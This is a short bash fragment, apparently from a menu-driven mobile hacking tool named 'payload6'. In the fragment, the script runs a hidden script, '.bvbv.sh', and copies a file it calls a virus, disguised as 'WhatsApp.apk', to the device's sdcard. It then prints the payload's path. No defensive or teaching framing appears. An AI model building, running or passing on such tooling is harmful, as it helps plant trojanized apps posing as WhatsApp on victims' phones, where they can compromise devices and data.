echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload6.sh
else
cd $HOME/payload6
chmod +x .bvbv.sh
sh .bvbv.sh
cp $HOME/payload6/.viros/WhatsApp.apk /sdcard/payload6
echo -e "$green               end the vairos----->(WhatsApp) "
echo ""
echo "      Path of the pyload----->  sdcard/payload6/WhatsApp.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload6.sh

